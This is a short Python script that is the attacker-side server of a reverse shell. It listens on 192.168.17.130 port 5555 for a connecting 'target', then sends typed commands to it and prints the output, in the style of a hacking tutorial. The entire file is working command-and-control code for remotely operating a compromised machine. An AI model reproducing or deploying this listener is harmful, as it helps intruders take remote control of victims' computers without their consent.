import socket
import termcolor

def shell():
	while True:
		command = input('* Shell~%s: ' % str(ip))
		target.send(command.encode('utf-8'))
		if command == "quit":
			break
		else:
			#target.sendall(command.encode('utf-8'))
			massage = target.recv(1024)
			print(massage.decode('utf-8'))

def server():
	global sock, ip, target
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.bind(('192.168.17.130', 5555))
	print(termcolor.colored('[+] Listening For The Incoming Connections', 'green'))
	sock.listen(5)
	target, ip = sock.accept()
	print(termcolor.colored('[+] Target Connected From: ' + str(ip), 'green'))

server()
shell()
